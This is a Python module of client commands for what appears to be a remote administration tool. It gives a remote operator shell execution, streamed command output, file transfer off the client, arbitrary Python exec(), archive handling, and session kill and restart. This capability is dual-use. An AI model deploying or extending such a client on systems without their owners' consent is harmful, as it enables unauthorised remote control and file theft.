import contextlib
import inspect
import io
import locale
import os
import subprocess
import sys
import threading
import time

from client.commands.base import CommandBase
from core.utils.decorator import desc
from core.utils.formatting import format_dict


class CommonCommands(CommandBase):
    """跨平台通用命令集合"""

    # ------------------ 通用输出/子进程工具 ------------------ #
    def _get_default_encoding(self):
        """
        获取系统默认编码
        """
        return locale.getdefaultlocale()[1] or 'utf-8'

    def _stream_process_output(self, stream):
        """
        持续读取子进程输出流并发送中间结果
        """
        encoding = self._get_default_encoding()
        while True:
            line = stream.readline()
            if not line:
                break
            self._send_interim_result(1, line.decode(encoding, errors='replace').rstrip('\n'))

    def _run_shell_command(self, command):
        """
        执行一次性 shell 命令
        """
        return subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8',
            errors='replace'
        )

    def _start_stream_process(self, command):
        """
        启动带流式输出的子进程
        """
        return subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL
        )

    def _start_output_threads(self, process):
        """
        为 stdout/stderr 启动输出读取线程
        """
        stdout_thread = threading.Thread(target=self._stream_process_output, args=(process.stdout,))
        stderr_thread = threading.Thread(target=self._stream_process_output, args=(process.stderr,))
        stdout_thread.daemon = True
        stderr_thread.daemon = True
        stdout_thread.start()
        stderr_thread.start()
        return stdout_thread, stderr_thread

    def _get_exported_command_methods(self):
        """
        获取所有可导出的命令方法
        """
        return {
            name: method
            for name, method in inspect.getmembers(
                self,
                lambda x: inspect.isfunction(x) or inspect.ismethod(x)
            )
            if hasattr(method, 'help')
        }

    def _validate_directory_exists(self, path):
        """
        校验目录是否存在，并返回绝对路径
        """
        directory = os.path.abspath(path)
        if not os.path.isdir(directory):
            raise FileNotFoundError(f'Directory not found: {directory}')
        return directory

    def _validate_file_exists(self, path):
        """
        校验文件是否存在，并返回绝对路径
        """
        file_path = os.path.abspath(path)
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f'File not found: {file_path}')
        return file_path

    def _build_restart_command(self):
        """
        构造当前程序重启命令
        """
        if os.name == 'nt':
            from core.utils.client_util.win32util import get_executable_path
            return get_executable_path()

        if os.name == 'posix':
            executable_path = os.path.realpath(sys.executable)
            script_path = os.path.realpath(''.join(sys.argv))
            return f'{executable_path} {script_path}'

        raise RuntimeError(f'Unsupported platform: {os.name}')

    # ------------------ 基础命令 ------------------ #
    @desc('Change working directory')
    def cd(self, path):
        try:
            os.chdir(path)
            return 1, ""
        except Exception as e:
            return 0, f'Failed to change directory: {e}'

    @desc('Run a shell command')
    def shell(self, command):
        try:
            result = self._run_shell_command(command)
            if result.returncode == 0:
                return 1, result.stdout
            return 0, result.stderr or f'Command exited with code {result.returncode}'
        except Exception as e:
            return 0, f'Failed to execute command: {e}'

    @desc('Run a command with live output')
    def read(self, command):
        try:
            process = self._start_stream_process(command)
            self._start_output_threads(process)
            process.wait()
            time.sleep(0.1)

            if process.returncode == 0:
                self._send_final_result(1, "Command completed")
            else:
                self._send_final_result(0, f'Command exited with code {process.returncode}')
        except Exception as e:
            self._send_final_result(0, f'Failed to execute command: {e}')

    @desc('Download a file from the client')
    def download(self, filename):
        if os.path.isfile(filename):
            file_size = os.path.getsize(filename)
            self.socket.send_result(self.command_id, 1, 'Preparing file transfer...', eof=0)
            self.socket.send_result(self.command_id, 1, f'File size: {file_size} bytes', eof=0)
            self.socket.send_file(self.command_id, filename)
        else:
            return 0, f'File not found: {os.path.abspath(filename)}'

    @desc('Execute Python code')
    def pyexec(self, code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        output = io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(output):
            exec(code, kwargs)
        return 1, output.getvalue()

    @desc('Show available commands')
    def help(self):
        methods = self._get_exported_command_methods()
        return 1, format_dict({name: method.help for name, method in methods.items()})

    # ------------------ 压缩文件 ------------------ #
    @desc('Create a ZIP archive')
    def zip(self, dir_name):
        import pathlib
        import shutil
        import tempfile

        try:
            temp_dir = tempfile.mkdtemp()
            directory = self._validate_directory_exists(dir_name)
            archive_name = os.path.basename(directory)
            parent_dir = pathlib.Path(directory).resolve().parent

            archive_path = shutil.make_archive(
                os.path.join(temp_dir, archive_name),
                format='zip',
                root_dir=parent_dir,
                base_dir=os.path.basename(directory)
            )
            return 1, f'Archive created successfully: {archive_path}'
        except Exception as e:
            return 0, f'Failed to create archive: {e}'

    @desc('Extract a ZIP archive')
    def unzip(self, zip_name):
        import shutil

        try:
            archive_path = self._validate_file_exists(zip_name)
            shutil.unpack_archive(archive_path, os.getcwd())
            return 1, f'Archive extracted to: {os.getcwd()}'
        except Exception as e:
            return 0, f'Failed to extract archive: {e}'

    # ------------------ 连接控制 ------------------ #
    @desc('Terminate current session')
    def kill(self):
        self.socket.close()
        sys.exit(0)

    @desc('Restart client process and reconnect')
    def reset(self):
        restart_command = self._build_restart_command()
        if os.name == 'nt':
            subprocess.Popen(restart_command)
        elif os.name == 'posix':
            subprocess.Popen(restart_command, shell=True)
        self.socket.close()
        sys.exit(0)